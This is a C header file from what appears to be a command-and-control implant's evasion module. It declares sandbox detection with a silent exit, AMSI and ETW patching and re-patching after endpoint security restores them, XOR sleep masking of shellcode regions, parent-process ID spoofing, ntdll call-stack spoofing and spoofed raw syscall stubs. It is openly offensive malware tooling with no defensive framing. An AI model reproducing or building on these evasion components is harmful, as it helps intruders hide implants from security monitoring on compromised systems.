#pragma once
#ifdef _WIN32
#include <windows.h>

/* Score-based sandbox/analysis detection — exits process silently if detected */
void sandbox_check(void);

/* Call once at startup: patches AMSI/ETW, resolves fn ptrs, finds .text */
void evasion_init(void);

/* Re-apply AMSI + ETW patches post-compromise (if EDR restored them) */
void amsi_bypass(void);

/* Unconditionally patch AMSI+ETW in the CLR fork-and-run child process.
 * Must be called before ICorRuntimeHost loads any .NET assembly. */
void clr_amsi_init(void);

/* Sleeps via NtDelayExecution; optionally masks registered external regions.
 * Runs from .evasn — never touches the agent's own .text.
 * Masking is skipped while any conn_thread is active (g_conn_thread_count > 0). */
void sleep_masked(DWORD ms);

/* Register an external shellcode/payload region for XOR masking during sleep.
 * Only call for memory that will NOT be executing when sleep_masked fires. */
void evasion_register_region(void *base, SIZE_T sz);

/* Call from conn_thread start/end to inhibit sleep masking while active. */
void evasion_conn_enter(void);
void evasion_conn_leave(void);

/* Spawn cmd with parent_name as spoofed PPID. Returns 1 on success. */
int spawn_with_ppid(const char *cmd, const char *parent_name);

/* Thread worker + shared struct for safe (timeout-aware) PPID dispatch */
typedef struct { char cmd[512]; char parent[128]; int ok; DWORD err; } PpidWork;
DWORD WINAPI ppid_worker(LPVOID arg);

/* ── Phase 10: Call-stack spoofing via ntdll gadget scan ─────────────────
 *
 * 110-byte spoofed stubs plant a call-preceded RET address from ntdll at
 * [RSP] before the syscall instruction so that an EDR stack-walker sees:
 *   ntdll!NtXxx           ← syscall executes here  (syscall;ret gadget)
 *   ntdll+X               ← call-preceded RET       (spoof gadget)   ✓
 */

#ifndef NTSTATUS
typedef LONG NTSTATUS;
#endif
#ifndef NTAPI
#define NTAPI __stdcall
#endif

/* NT syscall function-pointer types */
typedef NTSTATUS (NTAPI *NtAllocVMem_t)(HANDLE, PVOID *, ULONG_PTR, PSIZE_T, ULONG, ULONG);
typedef NTSTATUS (NTAPI *NtProtVMem_t)(HANDLE, PVOID *, PSIZE_T, ULONG, PULONG);
typedef NTSTATUS (NTAPI *NtCreateThreadEx_t)(PHANDLE, ACCESS_MASK, PVOID, HANDLE,
                                              PVOID, PVOID, ULONG,
                                              SIZE_T, SIZE_T, SIZE_T, PVOID);
typedef NTSTATUS (NTAPI *NtDelayExec_t)(BOOLEAN, PLARGE_INTEGER);

/* Spoofed stub pointers — NULL until init_stack_spoof() succeeds */
extern NtAllocVMem_t      g_NtAllocVM;
extern NtProtVMem_t       g_NtProtVM;
extern NtCreateThreadEx_t g_NtCreateThread;
extern NtDelayExec_t      g_NtDelayExec;

/* Called internally by evasion_init() — do not call directly */
void init_stack_spoof(void);

void mem_fluctuate_start(int interval_sec);
void mem_fluctuate_stop(void);

/* Build a spoofed stub for any raw syscall number on demand.
 * Returns a callable function pointer, or NULL if unavailable. */
void *spoof_syscall_stub(unsigned short ssn);

#else /* !_WIN32 — Linux stubs */
#include <unistd.h>
static inline void sandbox_check(void) {}
static inline void evasion_init(void)  {}
static inline void sleep_masked(unsigned long ms) { usleep((unsigned int)(ms * 1000UL)); }
#endif /* _WIN32 */
